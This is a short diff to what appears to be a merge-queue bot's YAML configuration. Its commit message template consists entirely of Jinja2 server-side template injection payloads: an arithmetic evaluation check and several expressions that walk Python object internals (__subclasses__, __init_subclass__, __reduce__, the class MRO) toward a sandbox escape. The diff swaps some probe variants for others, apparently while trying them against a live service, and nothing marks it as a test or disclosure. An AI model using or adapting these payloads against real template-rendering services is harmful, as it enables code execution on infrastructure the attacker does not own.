@@ -6,11 +6,9 @@ queue_rules:
     commit_message_template: |
       SSTI: {{ 7*7 }}
       SC_ON_DICT: {{ [dict]|map(attribute="__subclasses__")|list }}
-      SC_ON_TYPE: {{ [dict['__class__']]|map(attribute="__subclasses__")|list }}
-      SC_ON_OBJ: {{ [dict['__class__'].mro()|last]|map(attribute="__subclasses__")|list }}
-      INITSUB_ON_DICT: {{ [dict]|map(attribute="__init_subclass__")|list }}
-      DIR_SC: {{ dict['__subclasses__']() }}
-      TYPE_SC: {{ type['__subclasses__']() }}
+      INITSUB_DICT: {{ [dict]|map(attribute="__init_subclass__")|list }}
+      REDUCE_DICT: {{ [dict]|map(attribute="__reduce__")|list }}
+      DIR_CLASS: {{ dict['__class__'] }}
 pull_request_rules:
   - name: q
     conditions:
